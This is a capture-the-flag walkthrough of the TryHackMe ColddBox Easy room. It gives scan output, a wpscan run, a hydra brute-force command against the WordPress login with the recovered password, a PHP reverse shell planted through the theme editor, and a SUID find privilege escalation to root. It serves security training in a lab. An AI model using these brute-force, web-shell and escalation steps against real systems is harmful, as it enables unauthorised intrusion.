---
layout: post
title: Walkthrough - Colddbox - Easy
published: true
---

Security, Box, PrivEsc, Wordpress. An easy level machine with multiple ways to escalate privileges.

[https://tryhackme.com/room/colddboxeasy](https://tryhackme.com/room/colddboxeasy)

* * *

## Notes

- nmap scans

```shell
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- gobuster initial

```shell
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.210.65/wp-content/]
/license.txt          (Status: 200) [Size: 19930]                                    
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.210.65/wp-includes/]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.210.65/wp-admin/]   
/hidden               (Status: 301) [Size: 313] [--> http://10.10.210.65/hidden/]     
/server-status        (Status: 403) [Size: 277]        
```

- ``/hidden/`` gives us some credentials. C0ldd, hugo, philip.
- ``wpscan --url http://10.10.210.65 -e vp --api-token``
- ``wpxploit`` - ``./exploit.py http://10.10.210.65/ 5 15`` with C0ldd and 0 wordlist we get access.
- ``hydra -l C0ldd -P /usr/share/seclists/Passwords/rockyou.txt 10.10.210.65 http-post-form -m '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+in:The password you entered'``
- ``[80][http-post-form] host: 10.10.210.65   login: C0ldd   password: 9876543210``

* * * 

## What is the user flag?

- login to wp-admin with the credentials and use the appearance editor to edit the main index template - index.php with php monkey reverse shell. 

![](/assets/c0ld01.png)

- ``find / -perm -u=s -type f 2>/dev/null``
- ``/usr/bin/find`` has suid set
- ``find . -exec /bin/sh -p \; -quit`` to gain root.

* * * 

## What is the root flag?

- ``cat /root/root.txt``

* * * 

